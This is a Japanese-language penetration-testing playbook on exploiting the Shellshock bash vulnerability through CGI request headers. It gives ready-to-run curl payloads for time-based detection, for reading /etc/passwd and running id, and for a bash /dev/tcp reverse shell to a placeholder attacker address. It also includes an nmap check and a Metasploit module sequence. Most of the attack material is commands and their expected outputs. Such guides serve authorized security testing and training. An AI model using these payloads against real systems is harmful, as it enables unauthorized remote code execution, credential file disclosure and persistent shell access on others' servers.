# Shellshock（bash 環境変数インジェクション）

> **スコープ**: GNU bash の関数定義パース不備（CVE-2014-6271 を本丸とする 2014 年の一連＝Shellshock）を、「外部入力が環境変数経由で bash に渡る」経路（主に CGI）から突いて RCE を取るまで。検出（time-based）→ 手動 RCE → Metasploit を扱う。汎用の OS コマンド注入は `./Web_Vulnerabilities/Command_Injection.md`、ファイル取り込み経由の実行は `./Web_Vulnerabilities/LFI.md` を参照。

## 着火条件

- HTTP で **CGI**（`/cgi-bin/` 配下の `.cgi` / `.sh`、`mod_cgi` / `mod_cgid`）が動いている。または DHCP クライアント・一部メール処理など「外部入力を環境変数にしてから bash を起動する」処理がある
- 対象が**古い** Linux/UNIX（2014 年 9 月以前の bash・組み込み機器・レガシアプライアンス）。`searchsploit` で他コンポーネントも軒並み古い場合に併せて疑う
- nmap の http-title やサービスバナーから「CGI を使う古い Web 製品」と推定できる

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用 Linux ディストリ標準搭載）/ `nmap`（`http-shellshock` スクリプト同梱）/ Metasploit（§3・標準搭載）
- 外部リソース依存: なし（time-based 検証は対象への直リクエストのみ）

## 先に確認すること

- **CGI のパスを先に列挙する。** Shellshock は「bash を起動する CGI」に当たって初めて発火する。スクリプト名が不明なら `../01_Reconnaissance/Web_Enumeration.md` のファジングで `.cgi` / `.sh` を掘る（`-x cgi,sh`）。エンドポイントが無ければこの手法は空振り
- **注入点はリクエスト本文ではなくヘッダ。** ペイロードは `User-Agent` / `Referer` / `Cookie` 等、CGI が環境変数化するヘッダに入れる。URL パラメータには通常入らない

攻撃者の思考トレース: 古い CGI を見つけたら、まず **time-based**（`sleep`）で「ヘッダに仕込んだコマンドが実行されるか」を破壊せず確認 → 反応すれば `id` 等で出力を取り、リバースシェルへ。実行ユーザは Web プロセス権限（`apache` / `www-data` 等）が普通なので、取得後は別途権限昇格（`../03_Post_Access_Linux/`）。

---

## 1. 検出（time-based / nmap）

**コマンド:**

```bash
# [Attacker] time-based: 応答が ~10 秒遅延すれば実行されている（破壊せず確認）
curl -s -o /dev/null -w "%{time_total}\n" \
  -H 'User-Agent: () { :; }; /bin/sleep 10' \
  "https://[TARGET]/cgi-bin/[SCRIPT]"

# [Attacker] nmap スクリプトでの一括判定
nmap -p 80,443 --script http-shellshock --script-args uri=/cgi-bin/[SCRIPT] [TARGET]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 応答が ~10 秒遅延 | bash が `sleep` を実行＝脆弱 | §2 で出力を取る RCE へ |
| 即時応答（遅延なし） | 当該ヘッダ/パスでは未発火 | 別ヘッダ（Referer/Cookie）・別 CGI を試す。全滅なら非該当 |
| `http-shellshock: VULNERABLE` | nmap が確証 | §2 へ |

**注意:** `() { :; };` の後ろに**スペース**を入れてコマンドを置く（この空関数定義の直後にコマンドを連結するのが CVE-2014-6271 形）。部分パッチ済み（CVE-2014-7169 等）の相手には後続バリアントのペイロードが要る場合がある。

---

## 2. 手動 RCE（出力取得 → リバースシェル）

**事前準備（必須）：** リバースシェルの前に受信リスナーを起動し、到達可能 IP を確認する。
```bash
# [Attacker] 別ウィンドウ
nc -lvnp [PORT]
ip a            # [ATTACKER_IP] = 対象から到達できるインターフェースのアドレス
```

**コマンド:**

```bash
# [Attacker] コマンド出力を取得（実行ユーザ確認）
curl -s -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' \
  "https://[TARGET]/cgi-bin/[SCRIPT]"
curl -s -H 'User-Agent: () { :; }; echo; /usr/bin/id' \
  "https://[TARGET]/cgi-bin/[SCRIPT]"

# [Attacker] リバースシェル（bash 専用構文）
curl -s -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1' \
  "https://[TARGET]/cgi-bin/[SCRIPT]"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/etc/passwd` / `id` の出力が返る | RCE 確定 | リバースシェル → `../03_Post_Access_Linux/Shell_Stabilization.md` |
| `uid=...(apache)` / `(www-data)` | Web プロセス権限止まり | 取得後に権限昇格（`../03_Post_Access_Linux/Enumeration_Checklist.md`）|
| 何も返らないが §1 で遅延はあった | 出力が破棄される CGI | リバースシェル（出力に依存しない経路）に切替 |

**注意:** ヘッダ先頭で `echo;` を1つ挟むと、CGI が出すヘッダと本文の境界が崩れず出力が読みやすい。`>& /dev/tcp/...` は bash 専用（dash/sh では不可）。

---

## 3. Metasploit（自動化）

**コマンド:**

```bash
# [Attacker] msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS [TARGET]
set TARGETURI /cgi-bin/[SCRIPT]
set LHOST [ATTACKER_IP]
run
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Meterpreter / shell セッション | RCE 成立 | セッションで列挙 → 権限昇格 |
| `does not appear to be vulnerable` | パス/ヘッダ不一致・非該当 | §1〜§2 の手動で別ヘッダ・別 CGI を当たり直す |

**注意:** `TARGETURI` は §1 で実在確認した CGI を指すこと。手動（§1〜§2）と相互フォールバック：MSF が当たらない → 手動でヘッダ総当たり、手動が不安定 → MSF にペイロード処理を任せる。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `/cgi-bin/` に何も無い | CGI 非使用・パス不明 | `../01_Reconnaissance/Web_Enumeration.md` で `.cgi`/`.sh` をファジング。無ければ Shellshock 経路は無い |
| 遅延も出力も無い | bash パッチ済み or 起動シェルが dash | 別の入口（既知 CVE / LFI / 認証）へ。起動シェルが `/bin/sh`=dash なら非該当 |
| 一部ヘッダのみ無反応 | CGI が環境変数化するヘッダが限定 | User-Agent / Referer / Cookie / 独自ヘッダを順に試す |

## 注意点・落とし穴

- 実行ユーザは Web プロセス権限が普通（root ではない）。取得＝ゴールにせず横展開・昇格観点へ（`../03_Post_Access_Linux/`）
- time-based の `sleep` 自体は無害だが、リバースシェル取得後は接続ログ等の痕跡が残る。本番では取扱を事前合意する

## 関連技術

- 前：CGI パスの発見・Web 列挙 → `../01_Reconnaissance/Web_Enumeration.md`
- 関連：HTTP 入力経由の OS コマンド注入 → `./Web_Vulnerabilities/Command_Injection.md`
- 後：取得シェルの安定化と権限昇格 → `../03_Post_Access_Linux/Shell_Stabilization.md`
